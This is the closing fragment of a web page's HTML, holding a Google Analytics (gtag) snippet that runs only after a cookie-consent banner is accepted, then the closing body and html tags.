<script async src="https://www.googletagmanager.com/gtag/js?id=G-028MBYWX6K"></script>
<script>
 new CookiesEuBanner(function () {
	  window.dataLayer = window.dataLayer || [];
	  function gtag(){dataLayer.push(arguments);}
	  gtag('js', new Date());

	  gtag('config', 'G-028MBYWX6K');
  }, true);
</script>
  
</body>
</html>